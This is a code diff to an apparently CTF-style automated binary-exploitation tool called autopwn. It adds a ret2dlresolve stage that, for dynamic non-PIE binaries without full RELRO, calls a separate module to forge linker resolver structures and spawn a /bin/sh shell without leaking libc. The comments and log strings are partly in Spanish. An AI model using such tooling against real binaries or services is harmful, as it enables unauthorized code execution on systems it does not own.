@@ -269,6 +269,25 @@ def autopwn(binary: str, config=None, store=None,
         except Exception as e:
             res.attempts.append(("canary-bypass", False, str(e)))
 
+    # combo H: ret2dlresolve -- last resort for a dynamic, no-PIE binary with NO gift and NO leak
+    # (no win, no system in it): forge the linker's resolver structures to call system('/bin/sh')
+    # without leaking libc. Only worth trying when the simpler routes don't apply, so gate on
+    # dynamic + no-PIE + no win(); the driver re-checks RELRO/gadgets and degrades honestly.
+    relro_full = "full" in str(mit.get("relro", "")).lower()
+    if (run and want("dlresolve") and not is_pie and not relro_full and win is None
+            and not res.win_exploit and "system" not in sink_names):
+        log("[combo] ret2dlresolve: shell sin leak forjando el resolver dinamico (sandbox)...")
+        try:
+            from .autodlresolve import autodlresolve
+            rd = autodlresolve(binary)
+            verdict = True if rd.get("verified") else (None if rd.get("ok") else False)
+            res.attempts.append(("ret2dlresolve", verdict, rd.get("detail") or rd.get("note", "")))
+            res.win_exploit = res.win_exploit or bool(rd.get("verified"))
+            log(f"[combo] ret2dlresolve -> {'SHELL VERIFICADA' if rd.get('verified') else 'no verificado'}")
+            learn(f"ret2dlresolve verified={rd.get('verified')} {rd.get('detail','')}")
+        except Exception as e:
+            res.attempts.append(("ret2dlresolve", False, str(e)))
+
     log("[fin] combinaciones probadas: " + ", ".join(a[0] for a in res.attempts))
     return res
 
@@ -331,6 +350,8 @@ def _why(mit: dict, has_win: bool, technique: str) -> str:
         return "primitiva de heap (UAF/tcache) -> secuestro de puntero/GOT a win()/system"
     if "wow" in t or "write" in t:
         return "escritura arbitraria (indice sin check) -> GOT de funcion llamada despues = win()"
+    if "dlresolve" in t:
+        return "dinamico no-PIE sin win()/system ni leak -> se forjan las estructuras del resolver dinamico para llamar a system('/bin/sh') SIN fuga de libc"
     return "seleccionada segun las defensas y primitivas observadas"
 
 
